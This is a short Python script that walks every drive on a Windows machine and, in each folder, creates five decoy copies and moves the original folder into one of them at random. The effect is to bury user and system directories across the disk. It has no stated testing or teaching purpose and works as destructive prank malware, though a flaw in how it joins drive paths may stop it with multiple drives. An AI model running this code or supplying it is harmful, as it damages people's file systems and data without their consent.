import os
import shutil
import random

#get into a drive
#Duplicate the folders
    #change the original file
    #if there are files inside of it
        #redo duplicate
    #else
        #redo getinto
#redo 

def main():
    PATH = ''
    drives = list_drives()
    for drive in drives:
        PATH += drive
    file_cruser(PATH)
    return

def list_drives():
    drives = []

    for drive in range(ord('A'),ord('Z') + 1):
        drive_letter = chr(drive) + ':/'
        if os.path.exists(drive_letter):
            drives.append(drive_letter)
    
    return drives

def list_file(PATH):
    try:
        folders = [folder for folder in os.listdir(PATH) if os.path.isdir(os.path.join(PATH, folder)) and folder[0] != '$']
        return folders
    except:
        return ''

def file_cruser(PATH):
    folders = list_file(PATH)

    if len(folders) > 0:
        for folder in folders:
            newPATH = PATH
            newPATH += '/' + folder
            #print("Currently in:\n",newPATH)
            file_cruser(newPATH)
            try:
                Duplicate(PATH,folder)
            except:
                pass

    else:
        newPathList = PATH.rsplit('/',1)
        Path = newPathList[0]
        FolderName = newPathList[1]
        try:
            Duplicate(Path,FolderName)
        except:
            pass

def Duplicate(PATH,Name):
    #print("Duplicated:\n",PATH,f"({Name})")
    duplicatedFolders = []
    os.chdir(PATH)
    
    duplicates = 5
    for i in range(duplicates):
        newName = f"{Name}{i}"
        try:
            os.mkdir(newName)
            duplicatedFolders.append(newName)
        except:
            pass
    
    max = len(duplicatedFolders) - 1
    if max > 1:
        index = random.randint(0,max)
        src = PATH + '/' + Name
        dest = PATH + '/' + duplicatedFolders[index]
        destination = shutil.move(src,dest)
    else:
        pass

def duplicate(PATH,folder):
    print("Duplicated:\n",PATH,f"({folder})")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"An error occurred: {e}")
        input("Press Enter to exit...")